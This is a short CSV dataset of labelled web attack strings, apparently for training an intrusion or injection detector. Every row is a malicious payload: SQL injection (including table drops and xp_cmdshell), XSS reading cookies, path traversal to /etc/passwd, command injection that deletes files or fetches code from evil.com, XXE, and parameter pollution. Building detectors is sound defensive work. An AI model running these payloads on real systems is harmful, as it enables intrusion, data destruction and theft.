text,label,source
admin' OR '1'='1'--,1,owasp
"' UNION SELECT username, password FROM users--",1,owasp
'; DROP TABLE users;--,1,owasp
' OR 1=1--,1,owasp
admin'/*,1,owasp
' AND 1=0 UNION ALL SELECT credit_cards FROM customers--,1,owasp
'; EXEC xp_cmdshell('format c:');--,1,owasp
' WAITFOR DELAY '00:00:10'--,1,owasp
<script>alert('XSS')</script>,1,owasp
<img src=x onerror=alert(document.cookie)>,1,owasp
<body onload=alert('pwned')>,1,owasp
<svg onload=alert(1)>,1,owasp
javascript:alert('XSS'),1,owasp
script alert(1) script,1,owasp
<iframe src='javascript:alert(`xss`)'>,1,owasp
<div onmouseover='alert(1)'>,1,owasp
../../../etc/passwd,1,owasp
..\..\windows\system32\drivers\etc\hosts,1,owasp
....//....//....//etc/passwd,1,owasp
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,owasp
..%255c..%255c..%255cwindows%255csystem32%255ccmd.exe,1,owasp
| cat /etc/passwd,1,owasp
; rm -rf /,1,owasp
&& shutdown /s /t 0,1,owasp
| net user hacker Password123 /add,1,owasp
; wget http://evil.com/backdoor.sh,1,owasp
&& curl http://evil.com/malware.exe -o malware.exe,1,owasp
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,1,owasp
<!DOCTYPE test [ <!ENTITY % init SYSTEM 'http://evil.com/evil.dtd'> %init;]>,1,owasp
user=admin&user=guest,1,csic
id=1&id=2&id=3,1,csic
amount=100&amount=1000,1,csic
role=user&role=admin,1,csic
